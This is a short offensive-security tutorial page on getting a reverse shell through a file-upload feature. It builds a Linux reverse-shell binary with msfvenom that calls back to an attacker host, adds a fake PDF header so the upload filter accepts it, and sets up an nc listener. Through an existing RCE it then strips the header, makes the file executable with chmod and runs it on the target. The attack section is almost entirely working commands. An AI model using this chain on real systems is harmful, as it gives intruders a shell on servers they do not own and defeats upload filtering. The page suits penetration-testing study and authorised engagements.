---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# File Type

This is the case where we have access to a target server, but we don't have default options for file transfer, like wget, curl, etc.&#x20;

However, sometimes the application allows you to upload files with certain types of extensions or certain types of content. For example, the application allows us to upload a PDF file, with this we can forge a PDF with a binary inside the file and then we can extract this information from inside the file through the target server.

### Linux Attacker

I have access to the target server through an RCE in the URL, but I want access to a shell on the server. To do this I will create a reverse shell file with [MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) and make it recognized as a pdf file.

```bash
# Creating a reverse shell file with MSFvenom
msfvenom -p linux/x86/reverse_tcp lhost=attacker-ip lport=443 -f elf > revshell

# Creating a file with the header of a PDF file
echo "%PDF-1.3" > header

# Forging the binary file to be recognized as a PDF file
cat header revshell > forged-file

# Opening a local port to access the reverse shell
nc -vlnp 443
```

### Linux Target

First, we upload the forged-file file through the application.\
When you locate the file on the server, you need to remove the pdf header from the forged file so that it is recognized as a binary file again and can be executed.

{% hint style="info" %}
<mark style="color:purple;">**Note:**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">The following commands must be executed through the access you have to the target, such as an RCE</mark><mark style="color:purple;">**.**</mark>
{% endhint %}

```bash
# Removing the PDF header
tail -n +2 ./forged-file > revshell

# Giving permission to the file
chmod 777 revshell

# Run the file and check the nc command that ran on your machine
./revshell
```

